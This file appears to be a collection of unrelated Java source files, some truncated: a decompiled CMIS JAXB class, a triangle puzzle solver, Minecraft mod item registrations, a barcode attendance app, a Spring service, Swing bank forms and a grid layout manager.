    "/*     */ package org.apache.chemistry.opencmis.commons.impl.jaxb;\n/*     */ \n/*     */ import java.util.ArrayList;\n/*     */ import java.util.HashMap;\n/*     */ import java.util.List;\n/*     */ import java.util.Map;\n/*     */ import javax.xml.bind.annotation.XmlAccessType;\n/*     */ import javax.xml.bind.annotation.XmlAccessorType;\n/*     */ import javax.xml.bind.annotation.XmlAnyAttribute;\n/*     */ import javax.xml.bind.annotation.XmlAnyElement;\n/*     */ import javax.xml.bind.annotation.XmlElement;\n/*     */ import javax.xml.bind.annotation.XmlType;\n/*     */ import javax.xml.namespace.QName;\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ @XmlAccessorType(XmlAccessType.FIELD)\n/*     */ @XmlType(name = \"cmisRepositoryEntryType\", propOrder = {\"repositoryId\", \"repositoryName\", \"any\"})\n/*     */ public class CmisRepositoryEntryType\n/*     */ {\n/*     */   @XmlElement(required = true)\n/*     */   protected String repositoryId;\n/*     */   @XmlElement(required = true)\n/*     */   protected String repositoryName;\n/*     */   @XmlAnyElement(lax = true)\n/*     */   protected List<Object> any;\n/*     */   @XmlAnyAttribute\n/*  55 */   private Map<QName, String> otherAttributes = new HashMap<>();\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */   \n/*     */   public String getRepositoryId() {\n/*  67 */     return this.repositoryId;\n/*     */   }\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */   \n/*     */   public void setRepositoryId(String value) {\n/*  79 */     this.repositoryId = value;\n/*     */   }\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */   \n/*     */   public String getRepositoryName() {\n/*  91 */     return this.repositoryName;\n/*     */   }\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */   \n/*     */   public void setRepositoryName(String value) {\n/* 103 */     this.repositoryName = value;\n/*     */   }\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */   \n/*     */   public List<Object> getAny() {\n/* 130 */     if (this.any == null) {\n/* 131 */       this.any = new ArrayList();\n/*     */     }\n/* 133 */     return this.any;\n/*     */   }\n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */ \n/*     */   \n/*     */   public Map<QName, String> getOtherAttributes() {\n/* 151 */     return this.otherAttributes;\n/*     */   }\n/*     */ }\n\n\n/* Location:              E:\\web\\java_work\\jd-gui-windows-1.6.6\\chemistry-opencmis-commons-impl-1.1.0.jar!\\org\\apache\\chemistry\\opencmis\\commons\\impl\\jaxb\\CmisRepositoryEntryType.class\n * Java compiler version: 7 (51.0)\n * JD-Core Version:       1.1.3\n */",
    "package org.example.algoritmica.others.training;\n\nimport java.util.Arrays;\nimport java.util.List;\n\n/**\n * TriangleGame2\n *\n * @author Marcos Quispe\n * @since 1.0\n */\npublic class TriangleGame2 {\n\n    // 1. definir clase triangulo y que pueda rotar\n    // 2. recorrer los 6 triangulos y comparar extremos\n    // 3. condicion match entre actual y siguiente\n    // 4. incluir la rotacion\n    // 5. retornar la suma\n\n    public String resolve(List<Triangle> triangles) {\n        Integer sumaChildMax = Integer.MIN_VALUE;\n        for (int i = 0; i < 3; i++) {\n            int sumaChild = resolverMask(triangles, 0);\n            sumaChildMax = Math.max(sumaChildMax, sumaChild);\n\n            triangles.get(0).turn();\n        }\n\n        return (sumaChildMax.equals(Integer.MIN_VALUE)) ? \"none\" : String.valueOf(sumaChildMax);\n    }\n\n    private int resolverMask(List<Triangle> triangles, int index) {\n        //System.out.println(\"resolverMask index: \" + index);\n        if (index == triangles.size() - 1) {\n            if (triangles.get(index).getValueStart() == triangles.get(0).getValueEnd()) {\n                //System.out.println(\"match: \" + triangles.get(index).getValueStart());\n                return triangles.get(index).getValueMiddle();\n            }\n            return Integer.MIN_VALUE;\n        }\n\n        int sumaChildMax = Integer.MIN_VALUE;\n        for (int i = 0; i < 3; i++) {\n            if (triangles.get(index).getValueStart() == triangles.get(index + 1).getValueEnd()) {\n                //System.out.println(\"match: \" + triangles.get(index).getValueStart());\n                int sumaChild = resolverMask(triangles, index + 1);\n                sumaChildMax = Math.max(sumaChildMax, sumaChild);\n            }\n            triangles.get(index + 1).turn();\n        }\n\n        if (sumaChildMax == Integer.MIN_VALUE) {\n            return Integer.MIN_VALUE;\n        } else {\n            return sumaChildMax + triangles.get(index).getValueMiddle();\n        }\n    }\n\n    public static void main(String[] args) {\n        Triangle t = new Triangle(new int[] {3, 1, 5});\n//        System.out.println(t.getValueMiddle());\n//        t.turn();\n//        System.out.println(t.getValueMiddle());\n//        System.out.println(t);\n//        System.out.println(t.getValueStart());\n//        System.out.println(t.getValueEnd());\n//        t.turn();\n//        System.out.println();\n//        System.out.println(t);\n//        System.out.println(t.getValueStart());\n//        System.out.println(t.getValueEnd());\n\n        TriangleGame2 tg = new TriangleGame2();\n        List<Triangle> triangles;\n\n        triangles = Arrays.asList(\n                new Triangle(new int[] {1, 4, 20})\n                , new Triangle(new int[] {3, 1, 5})\n                , new Triangle(new int[] {50, 2, 3})\n                , new Triangle(new int[] {5, 2, 7})\n                , new Triangle(new int[] {7, 5, 20})\n                , new Triangle(new int[] {4, 7, 50})\n        );\n        System.out.println(tg.resolve(triangles));\n\n        triangles = Arrays.asList(\n                new Triangle(new int[] {10, 1, 20})\n                , new Triangle(new int[] {20, 2, 30})\n                , new Triangle(new int[] {30, 3, 40})\n                , new Triangle(new int[] {40, 4, 50})\n                , new Triangle(new int[] {50, 5, 60})\n                , new Triangle(new int[] {60, 6, 10})\n        );\n        System.out.println(tg.resolve(triangles));\n\n        triangles = Arrays.asList(\n                new Triangle(new int[] {10, 1, 20})\n                , new Triangle(new int[] {20, 2, 30})\n                , new Triangle(new int[] {30, 3, 40})\n                , new Triangle(new int[] {40, 4, 50})\n                , new Triangle(new int[] {50, 5, 60})\n                , new Triangle(new int[] {10, 6, 60})\n        );\n        System.out.println(tg.resolve(triangles));\n//        System.out.println(Integer.MIN_VALUE);\n    }\n\n}\n",
    "package net.illuminatijoe.esotericcircuitry.item;\n\nimport net.illuminatijoe.esotericcircuitry.EsotericCircuitry;\nimport net.minecraft.network.chat.Component;\nimport net.minecraft.world.item.Item;\nimport net.minecraft.world.item.ItemStack;\nimport net.minecraft.world.item.TooltipFlag;\nimport net.minecraft.world.level.Level;\nimport net.minecraftforge.eventbus.api.IEventBus;\nimport net.minecraftforge.registries.DeferredRegister;\nimport net.minecraftforge.registries.ForgeRegistries;\nimport net.minecraftforge.registries.RegistryObject;\nimport org.jetbrains.annotations.Nullable;\n\nimport java.util.List;\n\npublic class ModItems {\n    public static final DeferredRegister<Item> ITEMS =\n            DeferredRegister.create(ForgeRegistries.ITEMS, EsotericCircuitry.MOD_ID);\n\n    public static final RegistryObject<Item> COMPONENT_CONTAINER = ITEMS.register(\"component_container\",\n            () -> new Item(new Item.Properties()) {\n                @Override\n                public void appendHoverText(ItemStack pStack, @Nullable Level pLevel, List<Component> pTooltipComponents, TooltipFlag pIsAdvanced) {\n                    pTooltipComponents.add(Component.translatable(\"tooltip.esoteric_circuitry.component_container.tooltip\"));\n                    super.appendHoverText(pStack, pLevel, pTooltipComponents, pIsAdvanced);\n                }\n            }\n    );\n    public static final RegistryObject<Item> CONCEIVER_COMPONENT = ITEMS.register(\"conceiver_component\",\n            () -> new Item(new Item.Properties()) {\n                @Override\n                public void appendHoverText(ItemStack pStack, @Nullable Level pLevel, List<Component> pTooltipComponents, TooltipFlag pIsAdvanced) {\n                    pTooltipComponents.add(Component.translatable(\"tooltip.esoteric_circuitry.conceiver_component.tooltip\"));\n                    super.appendHoverText(pStack, pLevel, pTooltipComponents, pIsAdvanced);\n                }\n            });\n    public static final RegistryObject<Item> CONDUCTION_COMPONENT = ITEMS.register(\"conduction_component\",\n            () -> new Item(new Item.Properties()) {\n                @Override\n                public void appendHoverText(ItemStack pStack, @Nullable Level pLevel, List<Component> pTooltipComponents, TooltipFlag pIsAdvanced) {\n                    pTooltipComponents.add(Component.translatable(\"tooltip.esoteric_circuitry.conduction_component.tooltip\"));\n                    super.appendHoverText(pStack, pLevel, pTooltipComponents, pIsAdvanced);\n                }\n            });\n    public static final RegistryObject<Item> DIVINUM_CONTAINER = ITEMS.register(\"divinum_container\",\n            () -> new Item(new Item.Properties()));\n    public static final RegistryObject<Item> DIVINUM_INGOT = ITEMS.register(\"divinum_ingot\",\n            () -> new Item(new Item.Properties()));\n    public static final RegistryObject<Item> CIRCUIT_T1 = ITEMS.register(\"esoteric_circuit_tier_1\",\n            () -> new Item(new Item.Properties()) {\n                @Override\n                public void appendHoverText(ItemStack pStack, @Nullable Level pLevel, List<Component> pTooltipComponents, TooltipFlag pIsAdvanced) {\n                    pTooltipComponents.add(Component.translatable(\"tooltip.esoteric_circuitry.esoteric_circuit_tier_1.tooltip\"));\n                    super.appendHoverText(pStack, pLevel, pTooltipComponents, pIsAdvanced);\n                }\n            });\n    public static final RegistryObject<Item> EXCITATION_NODE = ITEMS.register(\"excitation_node\",\n            () -> new Item(new Item.Properties()));\n    public static final RegistryObject<Item> PERCEIVER_COMPONENT = ITEMS.register(\"perceiver_component\",\n            () -> new Item(new Item.Properties()) {\n                @Override\n                public void appendHoverText(ItemStack pStack, @Nullable Level pLevel, List<Component> pTooltipComponents, TooltipFlag pIsAdvanced) {\n                    pTooltipComponents.add(Component.translatable(\"tooltip.esoteric_circuitry.perceiver_component.tooltip\"));\n                    super.appendHoverText(pStack, pLevel, pTooltipComponents, pIsAdvanced);\n                }\n            });\n    public static final RegistryObject<Item> RECEIVER_COMPONENT = ITEMS.register(\"receiver_component\",\n            () -> new Item(new Item.Properties()) {\n                @Override\n                public void appendHoverText(ItemStack pStack, @Nullable Level pLevel, List<Component> pTooltipComponents, TooltipFlag pIsAdvanced) {\n                    pTooltipComponents.add(Component.translatable(\"tooltip.esoteric_circuitry.receiver_component.tooltip\"));\n                    super.appendHoverText(pStack, pLevel, pTooltipComponents, pIsAdvanced);\n                }\n            });\n\n    public static void register(IEventBus eventBus) {\n        ITEMS.register(eventBus);\n    }\n}\n",
    "import java.util.ArrayList;\nimport java.util.List;\n\npublic class GLA3Main {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tList<String> accountNames = new ArrayList<>();\n        accountNames.add(\"User-01\");\n        accountNames.add(\"User-02\");\n        accountNames.add(\"User-03\");\n\n        List<String> tweets = new ArrayList<>();\n        tweets.add(\"If Mr. X wins the election, there will be more unemployed population!\");\n        tweets.add(\"Unemployed population is likely to increase if Mr. X wins the election.\");\n        tweets.add(\"The weather is fantastic today. Mr. X may lose the election. However, Mr. X is not bad in my opinion\ufffd!\");\n        \n        \n        /*\n        tweets.add(\"Spaces are superior to tabs!\");\n        tweets.add(\"Why, are. soda tabs sharp?\");\n        tweets.add(\"Spaces are better than tabs are!\");\n        */\n        \n        /*\n        tweets.add(\"Even Odd Prime...\");\n        tweets.add(\"One Two Three\");\n        tweets.add(\"Two.. One,     Three!\");\n        */\n        \n\n        BotFinder myFinder = new BotFinder(accountNames, tweets);\n        String word=\"election\";\n        String accountName=\"User-01\";\n        double frequency = myFinder.getAccountWordFrequency(accountName, word);\n        System.out.println(\"\\nThe frequency score of the word (\"+word+\") in the account \"+accountName+\" is :\"+frequency);\n        \n        \n        \n        double maxFreqSum=0;\n        double curFreqSum=0;\n        \n        int index=0;\n        for(int i=0; i<accountNames.size(); i++)\n        {\n        \tcurFreqSum=myFinder.getAccountSimilarity(accountNames.get(i%accountNames.size()),accountNames.get((i+1)%accountNames.size()));\n        \tSystem.out.print(\"\\nThe similarity score between \"+accountNames.get(i%accountNames.size())+\" and \"+accountNames.get((i+1)%accountNames.size())+\" would be: \");\n        \tSystem.out.println(curFreqSum);\n        \tif(maxFreqSum<curFreqSum)\n        \t{\n        \t\tmaxFreqSum=curFreqSum;\n        \t\tindex=i;\n        \t}\n        }\n        System.out.println(\"\\nRobots are: \"+accountNames.get(index)+\" and \"+accountNames.get((index+1)%accountNames.size()));\n        \n\t}\n\n}\n",
    "\npackage barcodescanner;\n\nimport java.awt.event.*;\n//import java.lang.System.Logger.Level;\nimport javax.swing.JOptionPane;\nimport java.sql.*;\nimport java.util.logging.Logger;\n\n/**\n *\n * @author Saurabh\n */\npublic class ScanBarcode extends javax.swing.JFrame {\n                  \n    /**\n     * Creates new form ScanBarcode\n     */\n    public ScanBarcode() {\n        initComponents();\n        Connect();\n    }\n\n    Connection con;\n    PreparedStatement pst;\n    ResultSet rs;\n    \n    public void Connect(){\n        try{\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            con = DriverManager.getConnection(\"jdbc:mysql://localhost/simplejavaattendance\",\"root\",\"\");\n        } catch (ClassNotFoundException ex){\n            Logger.getLogger(ScanBarcode.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (SQLException ex) {\n            Logger.getLogger(ScanBarcode.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n    }\n    \n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        barcodeTxt = new javax.swing.JTextField();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        barcodeTxt.addKeyListener(new java.awt.event.KeyAdapter() {\n            public void keyPressed(java.awt.event.KeyEvent evt) {\n                barcodeTxtKeyPressed(evt);\n            }\n        });\n\n        jLabel1.setFont(new java.awt.Font(\"Times New Roman\", 0, 14)); // NOI18N\n        jLabel1.setText(\"Scan Barcode Here\");\n\n        jLabel2.setFont(new java.awt.Font(\"Tahoma\", 0, 18)); // NOI18N\n        jLabel2.setText(\"Scan Your Barcode Number For Attendance\");\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(40, 40, 40)\n                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                            .addGroup(layout.createSequentialGroup()\n                                .addGap(28, 28, 28)\n                                .addComponent(barcodeTxt, javax.swing.GroupLayout.PREFERRED_SIZE, 301, javax.swing.GroupLayout.PREFERRED_SIZE))\n                            .addGroup(layout.createSequentialGroup()\n                                .addGap(16, 16, 16)\n                                .addComponent(jLabel1))))\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(25, 25, 25)\n                        .addComponent(jLabel2)))\n                .addContainerGap(31, Short.MAX_VALUE))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGap(42, 42, 42)\n                .addComponent(jLabel2)\n                .addGap(28, 28, 28)\n                .addComponent(jLabel1)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addComponent(barcodeTxt, javax.swing.GroupLayout.PREFERRED_SIZE, 60, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(119, Short.MAX_VALUE))\n        );\n\n        pack();\n        setLocationRelativeTo(null);\n    }// </editor-fold>//GEN-END:initComponents\n\n    private void barcodeTxtKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_barcodeTxtKeyPressed\n        // TODO add your handling code here:\n        String Barcode = barcodeTxt.getText();\n        \n        if(evt.getKeyCode() == KeyEvent.VK_ENTER){\n            try{\n              // JOptionPane.showMessageDialog(this,\"Your Barcode number is:\"+Barcode);\n            \n            java.util.Date date = new java.util.Date();\n            java.sql.Date sqldate = new java.sql.Date(date.getTime());\n            java.sql.Timestamp sqltime = new java.sql.Timestamp(date.getTime());\n           \n            pst = con.prepareStatement(\"SELECT * FROM student WHERE barcodenumber=?\");\n           // pst.setString(0, attid);\n           pst.setString(1, Barcode);\n            rs = pst.executeQuery();\n            \n            if(rs.next()==true){\n                \n                pst = con.prepareStatement(\"INSERT INTO attendance (barcodenumber,logdate,time)VALUES(?,?,?)\");",
    "\npackage com.dataaccess.webservicesserver;\n\nimport javax.xml.bind.annotation.XmlAccessType;\nimport javax.xml.bind.annotation.XmlAccessorType;\nimport javax.xml.bind.annotation.XmlElement;\nimport javax.xml.bind.annotation.XmlRootElement;\nimport javax.xml.bind.annotation.XmlType;\n\n\n/**\n * <p>Java class for anonymous complex type.\n * \n * <p>The following schema fragment specifies the expected content contained within this class.\n * \n * <pre>\n * &lt;complexType&gt;\n *   &lt;complexContent&gt;\n *     &lt;restriction base=\"{http://www.w3.org/2001/XMLSchema}anyType\"&gt;\n *       &lt;sequence&gt;\n *         &lt;element name=\"NumberToWordsResult\" type=\"{http://www.w3.org/2001/XMLSchema}string\"/&gt;\n *       &lt;/sequence&gt;\n *     &lt;/restriction&gt;\n *   &lt;/complexContent&gt;\n * &lt;/complexType&gt;\n * </pre>\n * \n * \n */\n@XmlAccessorType(XmlAccessType.FIELD)\n@XmlType(name = \"\", propOrder = {\n    \"numberToWordsResult\"\n})\n@XmlRootElement(name = \"NumberToWordsResponse\")\npublic class NumberToWordsResponse {\n\n    @XmlElement(name = \"NumberToWordsResult\", required = true)\n    protected String numberToWordsResult;\n\n    /**\n     * Gets the value of the numberToWordsResult property.\n     * \n     * @return\n     *     possible object is\n     *     {@link String }\n     *     \n     */\n    public String getNumberToWordsResult() {\n        return numberToWordsResult;\n    }\n\n    /**\n     * Sets the value of the numberToWordsResult property.\n     * \n     * @param value\n     *     allowed object is\n     *     {@link String }\n     *     \n     */\n    public void setNumberToWordsResult(String value) {\n        this.numberToWordsResult = value;\n    }\n\n}\n",
    "package com.videomanage.video_manage_after.entity;\n\npublic class HistoryRecordDTO {\n    private int recordId,videoId;\n    private String title,kind,filePath,postPath,viewDate;\n\n    public int getRecordId() {\n        return recordId;\n    }\n\n    public int getVideoId() {\n        return videoId;\n    }\n\n    public void setVideoId(int videoId) {\n        this.videoId = videoId;\n    }\n\n    public void setRecordId(int recordId) {\n        this.recordId = recordId;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getKind() {\n        return kind;\n    }\n\n    public void setKind(String kind) {\n        this.kind = kind;\n    }\n\n    public String getFilePath() {\n        return filePath;\n    }\n\n    public void setFilePath(String filePath) {\n        this.filePath = filePath;\n    }\n\n    public String getPostPath() {\n        return postPath;\n    }\n\n    public void setPostPath(String postPath) {\n        this.postPath = postPath;\n    }\n\n    public String getViewDate() {\n        return viewDate;\n    }\n\n    public void setViewDate(String viewDate) {\n        this.viewDate = viewDate;\n    }\n}\n",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage com.jsm.services;\r\n\r\nimport com.jsm.news.entity.Autor;\r\nimport com.jsm.news.exceptions.MyExceptions;\r\nimport com.jsm.news.repository.autorRepository;\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Optional;\r\nimport org.springframework.beans.factory.annotation.Autowired;\r\nimport org.springframework.stereotype.Service;\r\nimport org.springframework.transaction.annotation.Transactional;\r\n\r\n@Service\r\npublic class AutorService {\r\n    \r\n    @Autowired\r\n    autorRepository autorrepositorio;\r\n    \r\n    @Transactional\r\n    public void crearAutor(String nombre) throws MyExceptions{\r\n        \r\n        if(nombre.isEmpty()|| nombre == null){\r\n            throw new MyExceptions(\"El Titulo no puede estar vacio o ser nulo\");\r\n        }\r\n        Autor autor= new Autor();\r\n        \r\n        autor.setNombre(nombre);\r\n        autorrepositorio.save(autor);\r\n    }\r\n    \r\n     public List<Autor> listarAutores(){\r\n        List<Autor> autores = new ArrayList();\r\n        autores = autorrepositorio.findAll();\r\n        \r\n        return autores;\r\n    }\r\n     public void modificarAutor(String id, String nombre){\r\n          \r\n         Optional <Autor> respuesta = autorrepositorio.findById(id);\r\n         if(respuesta.isPresent()){\r\n             Autor autor = respuesta.get();\r\n             \r\n             autor.setNombre(nombre);\r\n             autorrepositorio.save(autor);\r\n         }\r\n     }\r\n}\r\n",
    "package Bank.Management.System;\r\n\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\n\r\npublic class SingUp2 extends JFrame {\r\n    String formno;\r\n    SingUp2(String formno){\r\n        super(\"APPLICATION FORM\");\r\n\r\n        ImageIcon i1 = new ImageIcon(ClassLoader.getSystemResource(\"icon/bank.png\"));\r\n        Image i2 = i1.getImage().getScaledInstance(100,100, Image.SCALE_DEFAULT);\r\n        ImageIcon i3  = new ImageIcon(i2);\r\n        JLabel image = new JLabel(i3);\r\n        image.setBounds(150,5,100,100);\r\n        add(image);\r\n\r\n        this.formno = formno;\r\n\r\n        JLabel l1 = new JLabel(\"Page 2 :-\");\r\n        l1.setFont(new Font(\"Tahoma\",Font.BOLD,22));\r\n        l1.setBounds(300,30,600,40);\r\n        add(l1);\r\n\r\n        JLabel l2 = new JLabel(\"Additional details\");\r\n        l2.setFont(new Font(\"Tahoma\",Font.BOLD,22));\r\n        l2.setBounds(300,60,600,40);\r\n        add(l2);\r\n\r\n        JLabel l3 = new JLabel(\"Religion\");\r\n        l3.setBounds(100,120,100,30);\r\n        l3.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l3);\r\n        JComboBox comboBox =new JComboBox(  new String[]{\"Hindu\" , \"Muslim\" , \"Sinkh\" , \"Crichan\"});\r\n        comboBox.setBounds(350,120,320,30);\r\n        comboBox.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        comboBox.setBackground(new Color(255, 167, 45));\r\n        add(comboBox);\r\n\r\n        JLabel l4 = new JLabel(\"Category\");\r\n        l4.setBounds(100,170,100,30);\r\n        l4.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l4);\r\n        JComboBox comboBox2 =new JComboBox(  new String[]{\"General\" , \"Obc\" , \"sc\" , \"st\"});\r\n        comboBox2.setBounds(350,170,320,30);\r\n        comboBox2.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        comboBox2.setBackground(new Color(255, 167, 45));\r\n        add(comboBox2);\r\n\r\n        JLabel l5 = new JLabel(\"Income\");\r\n        l5.setBounds(100,220,100,30);\r\n        l5.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l5);\r\n        JComboBox comboBox3 =new JComboBox(  new String[]{\"Null\" , \"<1, 50,000\" , \"<2,50,000\" , \"<5,00000\" , \"<10,00000\"});\r\n        comboBox3.setBounds(350,220,320,30);\r\n        comboBox3.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        comboBox3.setBackground(new Color(255, 167, 45));\r\n        add(comboBox3);\r\n\r\n        JLabel l6 = new JLabel(\"Education qualification\");\r\n        l6.setBounds(100,270,200,30);\r\n        l6.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l6);\r\n        JComboBox comboBox4 =new JComboBox(  new String[]{\"10\" , \"10th +2\" , \"Graduation\" , \"Other\"});\r\n        comboBox4.setBounds(350,270,320,30);\r\n        comboBox4.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        comboBox4.setBackground(new Color(255, 167, 45));\r\n        add(comboBox4);\r\n\r\n        JLabel l7 = new JLabel(\"Occupation\");\r\n        l7.setBounds(100,320,100,30);\r\n        l7.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l7);\r\n        JComboBox comboBox5 =new JComboBox(  new String[]{\"Salaried\" , \"Self-Employee\" , \"Student\" , \"Other\"});\r\n        comboBox5.setBounds(350,320,320,30);\r\n        comboBox5.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        comboBox5.setBackground(new Color(255, 167, 45));\r\n        add(comboBox5);\r\n\r\n        JLabel l8 = new JLabel(\"PAN No\");\r\n        l8.setBounds(100,370,100,30);\r\n        l8.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l8);\r\n        JTextField t1 = new JTextField();\r\n        t1.setBounds(350,370,320,30);\r\n        t1.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n       t1.setBackground(new Color(255, 167, 45));\r\n        add(t1);\r\n\r\n        JLabel l9 = new JLabel(\"Aadhar No\");\r\n        l9.setBounds(100,420,100,30);\r\n        l9.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l9);\r\n        JTextField t2 = new JTextField();\r\n        t2.setBounds(350,420,320,30);\r\n        t2.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        t2.setBackground(new Color(255, 167, 45));\r\n        add(t2);\r\n\r\n        JLabel l10 = new JLabel(\"Senior citizen\");\r\n        l10.setBounds(100,470,150,30);\r\n        l10.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l10);\r\n        JRadioButton rb1 = new JRadioButton(\"Yes\");\r\n        rb1.setBounds(350,470,70,30);\r\n        rb1.setBackground(new Color(252,208,76));\r\n        rb1.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        add(rb1);\r\n        JRadioButton rb2 = new JRadioButton(\"No\");\r\n        rb2.setBounds(500,470,70,30);\r\n        rb2.setBackground(new Color(252,208,76));\r\n        rb2.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        add(rb2);\r\n        ButtonGroup buttonGroup = new ButtonGroup();\r\n        buttonGroup.add(rb1);\r\n        buttonGroup.add(rb2);\r\n\r\n\r\n        JLabel l11 = new JLabel(\" Existing Account\");\r\n        l11.setBounds(100,520,170,30);\r\n        l11.setFont(new Font(\"Thoma\",Font.BOLD,18));\r\n        add(l11);\r\n        JRadioButton rb3 = new JRadioButton(\"Yes\");\r\n        rb3.setBounds(350,520,70,30);\r\n        rb3.setBackground(new Color(252,208,76));\r\n ",
    "package com.cake.cmodels.converter_tool.user_interface.layout;\n\n\nimport com.cake.cmodels.converter_tool.user_interface.component.FloatingFolderInfoLink;\n\nimport java.awt.Component;\nimport java.awt.Container;\nimport java.awt.Dimension;\nimport java.awt.LayoutManager;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Supplier;\n\npublic class ResponsiveGridLayout implements LayoutManager {\n    \n    List<List<CellResponsiveStrategy>> gridResponsiveStrategies = new ArrayList<>();\n    Dimension size;\n    \n    public ResponsiveGridLayout(Dimension size) {\n        this.size = size;\n    }\n    \n    public void addRowStrategy(List<CellResponsiveStrategy> rowStrategy) {\n        gridResponsiveStrategies.add(rowStrategy);\n    }\n    \n    @Override\n    public void layoutContainer(Container parent) {\n        Component[] layoutComponents = parent.getComponents();\n        int columnCount = gridResponsiveStrategies.get(0).size();\n        \n        Dimension size = parent.getSize();\n        \n        //>SCALING\n        \n        //How much space is left in cells for weighted scales\n        List<Integer> remainingHeights = arrayOfLengthAndContents(columnCount, () -> size.height);\n        Integer remainingWidth = parent.getWidth();\n        \n        List<Integer> heightWeightSum = arrayOfLengthAndContents(columnCount, () -> 0);\n        Integer widthWeightSum = 0;\n        \n        //Apply any fixed widths\n        AtomicInteger columnIndex = new AtomicInteger();\n        AtomicInteger rowIndex = new AtomicInteger();\n        \n        //Also put together a row - column list for later\n        List<List<Component>> gridComponents = new ArrayList<>();\n        \n        for (Component component : layoutComponents) {\n            \n            CellResponsiveStrategy responsiveStrategy = getCellResponsiveStrategy(rowIndex, columnIndex);\n            if (gridComponents.size() <= columnIndex.get())\n                gridComponents.add(new ArrayList<>());\n            gridComponents.get(columnIndex.get()).add(component);\n            //Skip to next cell if this is merged, since merged cells don't have a corresponding component\n            if (responsiveStrategy instanceof CellResponsiveStrategy.MergeAbove) {\n                nextCell(columnIndex, rowIndex, columnCount);\n                \n                responsiveStrategy = getCellResponsiveStrategy(rowIndex, columnIndex);\n    \n                if (gridComponents.size() <= columnIndex.get())\n                    gridComponents.add(new ArrayList<>());\n                gridComponents.get(columnIndex.get()).add(null);\n            }\n            \n            //Subtract widths and heights from remaining\n            if (responsiveStrategy instanceof CellResponsiveStrategy.Scaled scaled) {\n                if (scaled.getXStrategy() == CellResponsiveStrategy.ScalingStrategy.SET_SIZE) {\n                    remainingWidth -= scaled.getX();\n                } else if (scaled.getXStrategy() == CellResponsiveStrategy.ScalingStrategy.WEIGHT) {\n                    //Width scales are relative to 1st only, merging stuff\n                    